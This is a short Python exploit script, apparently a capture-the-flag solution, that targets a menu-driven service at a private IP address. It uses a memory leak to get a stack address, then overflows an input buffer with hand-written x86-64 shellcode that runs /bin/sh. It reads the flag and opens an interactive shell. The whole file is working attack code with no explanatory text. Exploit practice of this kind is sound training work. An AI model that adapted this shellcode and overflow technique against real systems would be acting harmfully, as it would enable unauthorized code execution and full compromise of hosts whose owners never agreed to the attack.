from winpwn import *
ru=lambda s:p.recvuntil(s)
rl=lambda :p.recvline()
sl=lambda s:p.sendline(s)
sd=lambda s:p.send(s)
rn=lambda n:p.recvn(n)
context.timeout=3
p=remote('172.16.4.30',10000)
context.log_level='debug'
context.newline='\n'

def menu(i):
    ru('Enter your choice:\n')
    sl(str(i))
def input(con):
    menu(3)
    ru('What?\n')
    sd(con.ljust(0x40,'\x00'))
def leak(addr):
    input(p64(addr).ljust(0x28,'a')+p64(0x12345678))
    menu(2)

def exp(ip=None,port=None):
    leak(0x40085A)        # 2          
    ru('It is magic: [')
    stack_addr=int(ru(']').strip(']'),16)
    print(hex(stack_addr))
    # mov rax,/bin/sh
    shellcode="\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00"
    # push rax
    shellcode+='\x50'
    # xor rax,rax
    # mov al,59
    shellcode+='\x31\xC0'
    shellcode+='\xB0\x3B'
    # mov rdi,rsp
    shellcode+="\x48\x89\xE7"
    # xor rsi,rsi
    shellcode+='\x48\x31\xF6'
    # xor rdx,rdx
    shellcode+='\x48\x31\xD2'
    shellcode+='\x0F\x05'
    shellcode+='\xC3'
    payload=(shellcode).ljust(0x38)+p64(stack_addr)
    # debugf('b *0x40087C')
    input(payload)        #  1
    sl('cat flag')
    flag=p.recvline().strip('\n')
    print(flag)
    p.interactive()
exp()
